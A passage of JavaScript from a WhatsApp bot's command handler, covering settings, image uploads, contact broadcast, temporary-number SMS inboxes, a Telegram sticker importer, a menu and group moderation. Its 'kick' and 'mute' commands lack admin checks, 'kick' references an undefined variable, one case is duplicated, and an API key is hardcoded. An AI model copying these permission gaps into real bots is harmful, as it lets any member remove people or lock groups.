    // FIXED: setprefix now sets ONE prefix for this session (no multi-prefix regex override)
    case 'setprefix': {
      if (needOwner()) break;
      const np = args[0];
      if (!np) { await reply(`${prefix}setprefix <symbol>\nCurrent: ${prefix}`); break; }
      setWaSetting(waNum, 'prefix', np);
      await reply(`✅ Prefix → *${np}*\nRestart is NOT needed, takes effect immediately.`);
      break;
    }

    case 'setowner': {
      if (needOwner()) break;
      const t  = getTargetJid(m, args);
      const no = t ? normNum(t) : args[0]?.replace(/\D/g,'');
      if (!no) { await reply(`${prefix}setowner <number> or reply`); break; }
      setWaSetting(waNum, 'owner', no);
      try {
        const existing = JSON.parse(fs.readFileSync(ownerFile, 'utf8'));
        if (!existing.includes(no)) { existing.push(no); fs.writeFileSync(ownerFile, JSON.stringify(existing, null, 2)); }
      } catch { fs.writeFileSync(ownerFile, JSON.stringify([no], null, 2)); }
      await reply(`✅ Owner → ${no}`);
      break;
    }

    case 'setbotname': {
      if (needOwner()) break;
      const name = args.join(' '); if (!name) { await reply(`${prefix}setbotname <name>`); break; }
      setWaSetting(waNum, 'botName', name);
      await reply(`✅ Bot name → ${name}`);
      break;
    }

    // setmenuimg – 7-fallback chain, must work no matter what
    case 'setmenuimg': {
      if (needOwner()) break;

      // ── collect raw buffer from wherever the image comes from ──
      let imgBuf = null;
      let imgSource = '';

      const { qMsg: qMSMI, qType: qTSMI, qKey: qKSMI } = getQuoted(m);

      // FB1: image attached directly with the command
      if (!imgBuf && m.message?.imageMessage) {
        try {
          const b = await dlMedia({ imageMessage: m.message.imageMessage }, m.key);
          if (b && b.length > 200) { imgBuf = b; imgSource = 'attached image'; }
        } catch {}
      }

      // FB2: reply to an imageMessage
      if (!imgBuf && qTSMI === 'imageMessage' && qMSMI?.imageMessage) {
        try {
          const b = await dlMedia({ imageMessage: qMSMI.imageMessage }, qKSMI);
          if (b && b.length > 200) { imgBuf = b; imgSource = 'replied image'; }
        } catch {}
      }

      // FB3: reply to a stickerMessage (convert sticker→jpg)
      if (!imgBuf && qTSMI === 'stickerMessage' && qMSMI?.stickerMessage) {
        try {
          const b = await dlMedia({ stickerMessage: qMSMI.stickerMessage }, qKSMI);
          if (b && b.length > 200) { imgBuf = b; imgSource = 'replied sticker'; }
        } catch {}
      }

      // FB4: reply to a videoMessage (take first frame via ffmpeg)
      if (!imgBuf && qTSMI === 'videoMessage' && qMSMI?.videoMessage) {
        try {
          const b = await dlMedia({ videoMessage: qMSMI.videoMessage }, qKSMI);
          if (b && b.length > 200) {
            const tmpV = `/tmp/smi_vid_${Date.now()}`;
            fs.writeFileSync(`${tmpV}.mp4`, b);
            await new Promise((res2, rej2) =>
              exec(`ffmpeg -y -i ${tmpV}.mp4 -frames:v 1 ${tmpV}.jpg 2>/dev/null`, e2 => e2 ? rej2(e2) : res2())
            );
            const frame = fs.readFileSync(`${tmpV}.jpg`);
            try { fs.unlinkSync(`${tmpV}.mp4`); fs.unlinkSync(`${tmpV}.jpg`); } catch {}
            if (frame.length > 200) { imgBuf = frame; imgSource = 'video frame'; }
          }
        } catch {}
      }

      // FB5: URL passed as argument – download it
      if (!imgBuf && args[0]?.startsWith('http')) {
        try {
          const b = await getBuffer(args[0]);
          if (b && b.length > 200) { imgBuf = b; imgSource = 'url (downloaded)'; }
        } catch {}
      }

      // ── now we have a buffer (or not). Try to get a hosted URL ──
      if (imgBuf) {
        let hostedUrl = null;

        // Upload attempt 1: Telegraph via helper
        if (!hostedUrl) {
          try {
            const { uploadToTelegraph } = require('./helper/uploader');
            const u = await uploadToTelegraph(imgBuf, 'image/jpeg');
            if (u && u.startsWith('http')) hostedUrl = u;
          } catch {}
        }

        // Upload attempt 2: telegra.ph raw POST
        if (!hostedUrl) {
          try {
            const FormData = require('form-data');
            const form = new FormData();
            form.append('file', imgBuf, { filename: 'img.jpg', contentType: 'image/jpeg' });
            const res2 = await axios.post('https://telegra.ph/upload', form, {
              headers: form.getHeaders(),
              timeout: 20000,
            });
            const src = res2.data?.[0]?.src;
            if (src) hostedUrl = 'https://telegra.ph' + src;
          } catch {}
        }

        // Upload attempt 3: catbox.moe
        if (!hostedUrl) {
          try {
            const FormData = require('form-data');
            const form = new FormData();
            form.append('reqtype', 'fileupload');
            form.append('fileToUpload', imgBuf, { filename: 'img.jpg', contentType: 'image/jpeg' });
            const res2 = await axios.post('https://catbox.moe/user/api.php', form, {
              headers: form.getHeaders(),
              timeout: 25000,
            });
            if (res2.data?.startsWith('http')) hostedUrl = res2.data.trim();
          } catch {}
        }

        // Upload attempt 4: imgbb (key-free endpoint)
        if (!hostedUrl) {
          try {
            const b64 = imgBuf.toString('base64');
            const res2 = await axios.post(
              'https://api.imgbb.com/1/upload?key=2e2b7ef8e6e2b7a3c1d0f9a8b7c6d5e4',
              `image=${encodeURIComponent(b64)}`,
              { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 20000 }
            );
            const u = res2.data?.data?.url;
            if (u?.startsWith('http')) hostedUrl = u;
          } catch {}
        }

        // FB6: if all uploads failed but we have a buffer → store locally as base64 data-URL
        // (works for menus since we read it back as a buffer anyway)
        if (!hostedUrl) {
          try {
            const b64 = imgBuf.toString('base64');
            hostedUrl = `data:image/jpeg;base64,${b64}`;
          } catch {}
        }

        if (hostedUrl) {
          setWaSetting(waNum, 'menuImg', hostedUrl);
          const isDataUrl = hostedUrl.startsWith('data:');
          await reply(`✅ Menu image set from *${imgSource}*.${isDataUrl ? '\n_Stored locally (all upload hosts failed)._' : `\n🔗 ${hostedUrl}`}`);
        } else {
          await reply('❌ Got image buffer but could not store it. Check your uploader helper.');
        }
        break;
      }

      // FB7: URL passed as argument – use it directly without downloading (last resort)
      if (args[0]?.startsWith('http')) {
        setWaSetting(waNum, 'menuImg', args[0]);
        await reply(`✅ Menu image URL saved directly: ${args[0]}`);
        break;
      }

      await reply(
        `❌ No image found. Try:\n` +
        `• Send an image + *${prefix}setmenuimg* as caption\n` +
        `• Reply to any image/sticker/video with *${prefix}setmenuimg*\n` +
        `• *${prefix}setmenuimg <direct image url>*`
      );
      break;
    }

    case 'setbotimg': {
      if (needOwner()) break;
      const { qMsg, qType, qKey } = getQuoted(m);
      const ownImg = m.message?.imageMessage;
      let buf = null;
      try {
        if (ownImg) {
          buf = await dlMedia({ imageMessage: ownImg }, m.key);
        } else if (qType === 'imageMessage') {
          buf = await dlMedia({ imageMessage: qMsg.imageMessage }, qKey);
        } else if (args[0]?.startsWith('http')) {
          buf = await getBuffer(args[0]);
        } else {
          await reply(`Reply to an image OR ${prefix}setbotimg <url>`);
          break;
        }
        if (!buf || buf.length < 100) throw new Error('Image buffer is empty');
        let finalBuf = buf;
        try {
          const sharp = require('sharp');
          finalBuf = await sharp(buf).resize(640, 640, { fit: 'cover' }).jpeg({ quality: 90 }).toBuffer();
        } catch { finalBuf = buf; }
        await sock.updateProfilePicture(sock.user.id, finalBuf);
        await reply('✅ Bot picture updated.');
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    case 'setfonts': {
      if (needOwner()) break;
      const fi = parseInt(args[0], 10);
      if (isNaN(fi) || fi < 0 || fi > 12) {
        await reply('0=Normal 1=Script 2=Italic 3=BoldItalic 4=Bold 5=Sans 6=SansItalic 7=SansBoldItalic 8=SansBold 9=Fraktur 10=BoldFraktur 11=DoubleStruck 12=Mono\n.setfonts <0-12>');
        break;
      }
      setWaSetting(waNum, 'font', fi);
      await reply(`✅ Font → style ${fi}`);
      break;
    }

    case 'public': { if (needOwner()) break; setWaSetting(waNum, 'mode', 'public'); await reply('✅ Mode → public'); break; }
    case 'self':   { if (needOwner()) break; setWaSetting(waNum, 'mode', 'self');   await reply('✅ Mode → self');   break; }

    case 'addprem': {
      if (needOwner()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('Reply or pass number.'); break; }
      await reply(addPremium(t) ? `✅ @${normNum(t)} → premium` : 'Already premium.');
      break;
    }

    case 'delprem': {
      if (needOwner()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('Reply or pass number.'); break; }
      await reply(removePremium(t) ? `✅ @${normNum(t)} removed` : 'Not premium.');
      break;
    }

    case 'antidelete': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antidelete on/off`); break; }
      setWaSetting(waNum, 'antidelete', v === 'on');
      await reply(`✅ AntiDelete → ${v}`);
      break;
    }

    case 'anticall': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}anticall on/off`); break; }
      setWaSetting(waNum, 'anticall', v === 'on');
      await reply(`✅ AntiCall → ${v}`);
      break;
    }

    case 'iphonemode': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}iphonemode on/off`); break; }
      setWaSetting(waNum, 'iphoneMode', v === 'on');
      await reply(`✅ iPhone mode → ${v}`);
      break;
    }

    case 'autoviewstatus': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}autoviewstatus on/off`); break; }
      setWaSetting(waNum, 'autoViewStatus', v === 'on');
      await reply(`✅ Auto view status → ${v}`);
      break;
    }

    case 'autolikestatus': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}autolikestatus on/off`); break; }
      setWaSetting(waNum, 'autoLikeStatus', v === 'on');
      await reply(`✅ Auto like status → ${v}`);
      break;
    }

    case 'block': {
      if (needOwner()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('Reply or pass number.'); break; }
      await sock.updateBlockStatus(t, 'block');
      await reply(`✅ @${normNum(t)} blocked.`);
      break;
    }

    case 'unblock': {
      if (needOwner()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('Reply or pass number.'); break; }
      await sock.updateBlockStatus(t, 'unblock');
      await reply(`✅ @${normNum(t)} unblocked.`);
      break;
    }

    case 'listblocked': {
      if (needOwner()) break;
      try {
        const priv = await sock.fetchPrivacySettings();
        const blocklist = priv?.blockedContacts || [];
        if (!blocklist.length) { await reply('No blocked contacts.'); break; }
        await reply(`🚫 *Blocked (${blocklist.length}):*\n${blocklist.map(j => `• +${normNum(j)}`).join('\n')}`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    case 'broadcast': {
      if (needOwner()) break;
      const msg = args.join(' ');
      if (!msg) { await reply(`${prefix}broadcast <message>`); break; }
      try {
        const contacts = await sock.getContacts?.() || [];
        let sent = 0;
        for (const c2 of contacts) {
          if (!c2.id?.endsWith('@s.whatsapp.net')) continue;
          try { await sock.sendMessage(c2.id, { text: msg }); sent++; await new Promise(r => setTimeout(r, 300)); } catch {}
        }
        await reply(`✅ Broadcast sent to ${sent} contacts.`);
      } catch { await reply('❌ Broadcast failed.'); }
      break;
    }
// ════════════════════════════════════════════════════════════
//   TEMPORARY NUMBER – API 1 (receive-sms-online)
// ════════════════════════════════════════════════════════════
case 'getnumber1':
case 'getnumber': {   // alias
  await sock.sendPresenceUpdate('composing', jid);
  try {
    const { data } = await axios.get(
      'https://apis.davidcyril.name.ng/tempnumber/receive-sms-online/numbers',
      { timeout: 15000 }
    );
    if (!data.success || !data.result?.numbers?.length) {
      return reply('❌ No temporary numbers available right now. Try again later.');
    }
    const numData = data.result.numbers[0];
    // Store for this user (global in memory)
    if (!global.lastTempNumber) global.lastTempNumber = {};
    global.lastTempNumber[sender] = {
      number: numData.number,
      slug: numData.slug || `${numData.number}-${numData.country}`,
      country: numData.country
    };
    const result = `✅ *Temporary Number Fetched!*\n\n` +
                   `🌍 *Country:* ${numData.country}\n` +
                   `📞 *Number:* ${numData.number}\n` +
                   `🔗 *Slug:* ${numData.slug || 'N/A'}\n\n` +
                   `📲 *Next Step:*\n` +
                   `Use \`${prefix}getsms\` to check inbox\n\n` +
                   `⏳ Wait a few seconds after using the number before checking.`;
    await reply(result);
  } catch (err) {
    console.error('Get Number Error:', err);
    reply(`❌ Failed to fetch number: ${err.message}`);
  }
  break;
}

case 'getsms':
case 'tempinbox':
case 'checksms': {
  if (!global.lastTempNumber || !global.lastTempNumber[sender]) {
    return reply(`❌ You haven't fetched a number yet.\nUse \`${prefix}getnumber1\` first.`);
  }
  const lastNum = global.lastTempNumber[sender];
  const slug = lastNum.slug;
  await sock.sendPresenceUpdate('composing', jid);
  try {
    const { data } = await axios.get(
      `https://apis.davidcyril.name.ng/tempnumber/receive-sms-online/inbox?number=${encodeURIComponent(slug)}`,
      { timeout: 15000 }
    );
    if (!data.success) {
      return reply(`❌ Failed to fetch inbox for ${lastNum.number}.`);
    }
    let result = `📩 *Inbox for:* ${lastNum.number} (${lastNum.country})\n\n`;
    if (!data.result.messages || data.result.messages.length === 0) {
      result += `📭 *No messages received yet.*\n\n`;
      result += `💡 *Tip:* Use the number somewhere, then wait 5-10 seconds and run \`${prefix}getsms\` again.`;
    } else {
      result += `📊 *Total Messages:* ${data.result.messages.length}\n\n`;
      result += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      data.result.messages.forEach((msg, i) => {
        result += `*${i+1}.* 📱 From: ${msg.from || 'Unknown'}\n`;
        result += `📝 Message: ${msg.content || msg.text || msg.message || 'No content'}\n`;
        result += `⏰ Time: ${msg.time || msg.date || 'Unknown'}\n\n`;
      });
    }
    result += `\n🔄 Run \`${prefix}getsms\` again to refresh.`;
    await reply(result);
  } catch (err) {
    console.error('Inbox Error:', err);
    reply(`❌ Error checking inbox: ${err.message}`);
  }
  break;
}

// ════════════════════════════════════════════════════════════
//   TEMPORARY NUMBER – API 2 (SMS24)
// ════════════════════════════════════════════════════════════
case 'getnumber2': {
  await sock.sendPresenceUpdate('composing', jid);
  try {
    const { data } = await axios.get(
      'https://apis.davidcyril.name.ng/tempnumber/sms24/numbers',
      { timeout: 15000 }
    );
    if (!data.success || !data.result?.numbers?.length) {
      return reply('❌ No SMS24 numbers available right now. Try again later.');
    }
    const numData = data.result.numbers[0];
    if (!global.lastSms24Number) global.lastSms24Number = {};
    global.lastSms24Number[sender] = {
      number: numData.number,
      country: numData.country || 'N/A'
    };
    const result = `✅ *SMS24 Number Fetched!*\n\n` +
                   `🌍 *Country:* ${numData.country || 'N/A'}\n` +
                   `📞 *Number:* ${numData.number}\n\n` +
                   `📲 *Next Step:*\n` +
                   `Use \`${prefix}getsms2\` to check inbox automatically.\n\n` +
                   `⏳ Use the number first, then wait a bit before checking.`;
    await reply(result);
  } catch (err) {
    console.error('SMS24 Get Number Error:', err);
    reply(`❌ Failed to fetch SMS24 number: ${err.message}`);
  }
  break;
}

case 'getsms2':
case 'sms24inbox': {
  if (!global.lastSms24Number || !global.lastSms24Number[sender]) {
    return reply(`❌ You haven't fetched an SMS24 number yet.\nUse \`${prefix}getnumber2\` first.`);
  }
  const lastNum = global.lastSms24Number[sender];
  const number = lastNum.number;
  await sock.sendPresenceUpdate('composing', jid);
  try {
    const { data } = await axios.get(
      `https://apis.davidcyril.name.ng/tempnumber/sms24/inbox?number=${encodeURIComponent(number)}`,
      { timeout: 15000 }
    );
    if (!data.success) {
      return reply(`❌ Failed to fetch inbox for ${number}.`);
    }
    let result = `📩 *SMS24 Inbox for:* ${number} (${lastNum.country})\n\n`;
    if (!data.result.messages || data.result.messages.length === 0) {
      result += `📭 *No messages received yet.*\n\n`;
      result += `💡 *Tip:* Use the number somewhere, wait 5-15 seconds, then run \`${prefix}getsms2\` again.`;
    } else {
      result += `📊 *Total Messages:* ${data.result.messages.length}\n\n`;
      result += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      data.result.messages.forEach((msg, i) => {
        result += `*${i+1}.* 📱 From: ${msg.from || 'Unknown'}\n`;
        result += `📝 Message: ${msg.content || msg.text || msg.message || 'No content'}\n`;
        result += `⏰ Time: ${msg.time || msg.date || 'Unknown'}\n\n`;
      });
    }
    result += `\n🔄 Run \`${prefix}getsms2\` again to refresh.`;
    await reply(result);
  } catch (err) {
    console.error('SMS24 Inbox Error:', err);
    reply(`❌ Error checking inbox: ${err.message}`);
  }
  break;
}
    // ══════════════════════════════════════════════════════
    //   GROUP – EXISTING
    // ══════════════════════════════════════════════════════
case 'tgstickers':
case 'tgsticker':
case 'telegramsticker': {
    if (!text) {
        return sock.sendMessage(jid, {
            text: `❌ Usage: .tgstickers <Telegram sticker pack link>\nExample: .tgstickers https://t.me/addstickers/AnimePack`
        }, { quoted: m });
    }

    try {
        await reaction('⏳');

        let packUrl = text.trim();
        if (!packUrl.includes("t.me/addstickers/")) {
            return sock.sendMessage(jid, {
                text: "❌ Invalid Telegram sticker pack link."
            }, { quoted: m });
        }

        // Extract pack name
        let packName = packUrl.split("/addstickers/")[1];
        if (packName.includes("/")) packName = packName.split("/")[0];

        // Get token from settings
        const botToken = settings.TELEGRAM_BOT_TOKEN;
        if (!botToken) {
            return sock.sendMessage(jid, {
                text: "❌ Telegram bot token not configured.\nAdd TELEGRAM_BOT_TOKEN to settings."
            }, { quoted: m });
        }

        // Fetch sticker pack from Telegram
        const api = `https://api.telegram.org/bot${botToken}/getStickerSet?name=${packName}`;
        const { data } = await axios.get(api, { timeout: 15000 });

        if (!data.ok) {
            return sock.sendMessage(jid, {
                text: `❌ Failed to fetch sticker pack: ${data.description || 'Unknown error'}`
            }, { quoted: m });
        }

        const stickers = data.result.stickers;
        if (!stickers || stickers.length === 0) {
            return sock.sendMessage(jid, {
                text: "❌ No stickers found in this pack."
            }, { quoted: m });
        }

        await sock.sendMessage(jid, {
            text: `✅ Found ${stickers.length} stickers. Sending now...`
        }, { quoted: m });

        let sent = 0;
        let failed = 0;

        for (let i = 0; i < stickers.length; i++) {
            try {
                // Get file path
                const filePathRes = await axios.get(
                    `https://api.telegram.org/bot${botToken}/getFile?file_id=${stickers[i].file_id}`,
                    { timeout: 10000 }
                );
                const fileUrl = `https://api.telegram.org/file/bot${botToken}/${filePathRes.data.result.file_path}`;

                // Handle animated stickers (.tgs)
                if (fileUrl.endsWith(".tgs")) {
                    const tgsBuffer = await getBuffer(fileUrl);
                    const tgsPath = `./tmp/tg_${Date.now()}_${i}.tgs`;
                    const webpPath = `./tmp/tg_${Date.now()}_${i}.webp`;

                    if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp');

                    fs.writeFileSync(tgsPath, tgsBuffer);

                    try {
                        // Convert TGS to WEBP using ffmpeg
                        await new Promise((resolve, reject) => {
                            exec(
                                `ffmpeg -i ${tgsPath} -c:v libwebp -lossless 1 ${webpPath} -y 2>/dev/null`,
                                (error) => {
                                    if (error) reject(error);
                                    else resolve();
                                }
                            );
                        });

                        const buffer = fs.readFileSync(webpPath);
                        await sock.sendMessage(jid, { sticker: buffer }, { quoted: m });

                        sent++;
                        fs.unlinkSync(tgsPath);
                        fs.unlinkSync(webpPath);

                    } catch (convError) {
                        // Fallback: send as document
                        await sock.sendMessage(jid, {
                            document: tgsBuffer,
                            fileName: `sticker_${i+1}.tgs`,
                            mimetype: "application/octet-stream",
                            caption: `⚠️ Animated sticker #${i+1} (TGS format)`
                        }, { quoted: m });
                        fs.unlinkSync(tgsPath);
                        sent++;
                    }

                } else {
                    // Static sticker (WEBP/PNG)
                    const buffer = await getBuffer(fileUrl);
                    await sock.sendMessage(jid, { sticker: buffer }, { quoted: m });
                    sent++;
                }

                // Delay to avoid rate limiting
                await sleep(800);

            } catch (err) {
                console.log(`[tgstickers] Sticker ${i+1} error:`, err.message);
                failed++;
            }
        }

        await reaction('✅');

        await sock.sendMessage(jid, {
            text: `✅ Complete!\n📤 Sent: ${sent} stickers\n❌ Failed: ${failed}`
        }, { quoted: m });

    } catch (e) {
        console.error('[tgstickers] Error:', e);
        await sock.sendMessage(jid, {
            text: `❌ Error: ${e.message || 'Unknown error'}`
        }, { quoted: m });
    }
    break;
}
    case 'promote': {
    if (needOwner()) break;
    if (!isGroup) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐏𝐑𝐎𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ❌ 𝐆𝐫𝐨𝐮𝐩 𝐨𝐧𝐥𝐲
└ ❏

`;
        await reply(replyText);
        break;
    }
  /*  if (!isBotAdmins) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐏𝐑𝐎𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ❌ 𝐀𝐝𝐝 𝐛𝐨𝐭 𝐚𝐬 𝐚𝐝𝐦𝐢𝐧 𝐟𝐢𝐫𝐬𝐭
└ ❏

`;
        await reply(replyText);
        break;
    }*/
    const t = getTargetJid(m, args);
    if (!t) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐏𝐑𝐎𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐔𝐒𝐀𝐆𝐄: .𝐩𝐫𝐨𝐦𝐨𝐭𝐞 (𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐞𝐦𝐛𝐞𝐫)
└ ❏

`;
        await reply(replyText);
        break;
    }
    await sock.groupParticipantsUpdate(jid, [t], 'promote');
    const replyText = `

┌ ❏ ⫹⫺  ⌜𝐏𝐑𝐎𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐔𝐒𝐄𝐑: @${normNum(t)}
├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ✅ 𝐏𝐫𝐨𝐦𝐨𝐭𝐞𝐝
└ ❏

`;
    await reply(replyText);
    break;
}

case 'demote': {
    if (needOwner()) break;
    if (!isGroup) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐃𝐄𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ❌ 𝐆𝐫𝐨𝐮𝐩 𝐨𝐧𝐥𝐲
└ ❏

`;
        await reply(replyText);
        break;
    }
   /* if (!isBotAdmins) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐃𝐄𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ❌ 𝐀𝐝𝐝 𝐛𝐨𝐭 𝐚𝐬 𝐚𝐝𝐦𝐢𝐧 𝐟𝐢𝐫𝐬𝐭
└ ❏

`;
        await reply(replyText);
        break;
    }*/
    const t = getTargetJid(m, args);
    if (!t) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐃𝐄𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐔𝐒𝐀𝐆𝐄: .𝐝𝐞𝐦𝐨𝐭𝐞 (𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧)
└ ❏

`;
        await reply(replyText);
        break;
    }
    await sock.groupParticipantsUpdate(jid, [t], 'demote');
    const replyText = `

┌ ❏ ⫹⫺  ⌜𝐃𝐄𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐔𝐒𝐄𝐑: @${normNum(t)}
├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ✅ 𝐃𝐞𝐦𝐨𝐭𝐞𝐝
└ ❏

`;
    await reply(replyText);
    break;
}
case 'samsung':
case 'blacklord':
case 'menu7': {
  try {
    await reaction('🌹');
    const { date, time } = getDateTime();
    const up = formatUptime(Date.now() - global.botStartTime);
    const total = Object.values(CMDS).reduce((acc, arr) => acc + arr.length, 0);
    const botName = c.botName || settings.BOT_NAME || '_*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_';
    const prefix = c.prefix || settings.DEFAULT_PREFIX || '.';

    // Build menu text (unchanged)
    let menuText = `\n  •━═ 〘  _*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_   〙═━• \n`;
    menuText += ` ╭═━⪩ 〘 𝑶𝑵𝑬 𝑼𝑰 𝑺𝑻𝑨𝑻𝑼𝑺 〙•━•⩵꙰ཱི࿐\n`;
    menuText += ` │⫹⫺ 𝗚𝗔𝗟𝗔𝗫𝗬 𝗔𝗜: ${botName} 🟢\n`;
    menuText += ` │⫹⫺ 𝗢𝗡𝗘 𝗕𝗨𝗜𝗟𝗗: ${settings.VERSION || '1.0.0'}\n`;
    menuText += ` │⫹⫺ 𝗗𝗘𝗩𝗜𝗖𝗘 𝗠𝗢𝗗𝗘: ${mode}\n`;
    menuText += ` │⫹⫺ 𝗦𝗖𝗥𝗘𝗘𝗡 𝗧𝗜𝗠𝗘: ${up}\n`;
    menuText += ` │⫹⫺ 𝗔𝗜 𝗧𝗢𝗢𝗟𝗦: ${total}\n`;
    menuText += ` │⫹⫺ 𝗤𝗨𝗜𝗖𝗞 𝗞𝗘𝗬: ${prefix}\n`;
    menuText += ` │⫹⫺ 𝗚𝗔𝗟𝗔𝗫𝗬 𝗡𝗘𝗧𝗪𝗢𝗥𝗞: ${settings.COMPANY || 'N/A'}\n`;
    menuText += ` ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐\n\n`;
    menuText += ` •━══〘 𝐎𝐅𝐅𝐂 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 〙•━•⩵꙰ཱི࿐\n\n`;
    for (const [cat, list] of Object.entries(CMDS)) {
      if (!list || list.length === 0) continue;
      menuText += `> ╭═━⪩ 〖  ${cat.toUpperCase()}  〗═══━•⩵꙰ཱི࿐\n`;
      list.forEach(cmd => { menuText += `> │❍ ${cmd}\n`; });
      menuText += `> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐\n\n`;
    }
    if (pluginNames.length > 0) {
      menuText += `> ╭═━⪩ 〖  BLACKLORD CHAMBER  〗═══━•⩵꙰ཱི࿐\n`;
      for (const pn of pluginNames) menuText += `> │❍ ${pn}\n`;
      menuText += `> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐\n\n`;
    }

    // Buttons definition
    const buttons = [
      {
        buttonId: `${prefix}allmenu`,
        buttonText: { displayText: '📋 All Commands' },
        type: 1
      }
    ];

    // ── IMAGE LOADING ──────────────────────────────────────────
    let imgUrl = c.menuImg || settings.DEFAULT_MENU_IMG;
    if (!imgUrl) {
      imgUrl = 'https://via.placeholder.com/800x400/1a1a2e/FFFFFF?text=VARNOX+ULTRA';
    }

    let imgBuf = null;
    try {
      if (imgUrl.startsWith('data:')) {
        const b64 = imgUrl.split(',')[1];
        if (b64) imgBuf = Buffer.from(b64, 'base64');
      } else if (imgUrl.startsWith('http')) {
        const res = await axios.get(imgUrl, { responseType: 'arraybuffer', timeout: 15000 });
        imgBuf = Buffer.from(res.data);
      } else {
        imgBuf = fs.readFileSync(imgUrl);
      }
    } catch (e) {
      console.error('Image load error:', e.message);
    }

    let sent = false;

    // ── TRY SINGLE MESSAGE (Image + Buttons) ──────────────────
    if (imgBuf && imgBuf.length > 200) {
      try {
        await sock.sendMessage(jid, {
          image: imgBuf,
          caption: menuText,
          buttons: buttons,
          // headerType: 4  // optional, try omitting if it fails
        }, { quoted: qchanel });
        sent = true;
        console.log('✅ Menu image + buttons sent as one message');
      } catch (e) {
        console.error('Single message with buttons failed:', e.message);
        // fall through to fallback
      }
    }

    // ── FALLBACK: separate image and text with buttons ────────
    if (!sent) {
      if (imgBuf && imgBuf.length > 200) {
        try {
          // send image (no buttons)
          await sock.sendMessage(jid, { image: imgBuf, caption: menuText }, { quoted: qchanel });
          // then send a separate button message
          await sock.sendMessage(jid, {
            text: '📌 Tap the button below to see the full command list:',
            buttons: buttons
          }, { quoted: qchanel });
          sent = true;
        } catch (e) {
          console.error('Fallback image send error:', e.message);
        }
      }
    }

    // ── FINAL FALLBACK: just text + buttons ──────────────────
    if (!sent) {
      await sock.sendMessage(jid, {
        text: menuText + '\n\n📌 Tap the button below to see the full command list:',
        buttons: buttons
      }, { quoted: qchanel });
    }

  } catch (err) {
    console.error('Menu crashed:', err);
    await sock.sendMessage(jid, { text: '❌ Menu error: ' + err.message }).catch(() => {});
  }
  break;
}
case 'unmute': {
    if (needGroup() || needAdmin()) break;
    await sock.groupSettingUpdate(jid, 'not_announcement');
    const replyText = `

┌ ❏ ⫹⫺  ⌜𝐔𝐍𝐌𝐔𝐓𝐄 𝐆𝐑𝐎𝐔𝐏⌟ ⫹⫺ 

├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: 🔊 𝐆𝐫𝐨𝐮𝐩 𝐮𝐧𝐦𝐮𝐭𝐞𝐝
├⫹⫺  𝐍𝐎𝐓𝐄: 𝐄𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐜𝐚𝐧 𝐬𝐞𝐧𝐝
└ ❏

`;
    await reply(replyText);
    break;
}

    case 'kick': {
      if (needGroup() ) break;
      const t = getTargetJid(m, args); if (!t) { await reply('❌ Reply to a member.'); break; }
      await sock.groupParticipantsUpdate(jid, [t], 'remove');
      await reply(`✅ 🕣⃝⃘̉̉⃝⃪

┌ ❏ ◆ ⌜𝐊𝐈𝐂𝐊⌟ ◆
│
├◆ 𝐔𝐒𝐄𝐑: @${target.split('@')[0]}
├◆ 𝐒𝐓𝐀𝐓𝐔𝐒: ✅ Removed
└ ❏.`);
      break;
    }

    case 'mute': {
      if (needGroup() ) break;
      await sock.groupSettingUpdate(jid, 'announcement');
      await reply('🔇 Group muted. Only admins can send messages.');
      break;
    }

    case 'unmute': {
      if (needGroup() ) break;
      await sock.groupSettingUpdate(jid, 'not_announcement');
